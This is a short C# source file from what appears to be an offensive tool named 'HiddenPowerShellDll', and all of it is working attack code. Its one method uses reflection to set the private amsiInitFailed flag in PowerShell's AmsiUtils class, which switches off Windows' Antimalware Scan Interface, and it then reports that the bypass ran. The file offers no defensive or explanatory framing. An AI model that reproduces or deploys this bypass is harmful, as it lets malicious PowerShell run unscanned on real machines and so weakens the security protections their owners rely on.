using System;
using System.Reflection;

namespace HiddenPowerShellDll
{
    class HiddenPowerShellDllAmsiEV
    {
        public static int runBypass(Assembly assembly)
        {
            try
            {
                assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
                Console.WriteLine("[+] Amsi Bypass executed");
                return 0;
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error running asmi bypass");
                return 1;
            }
        }
    }
}
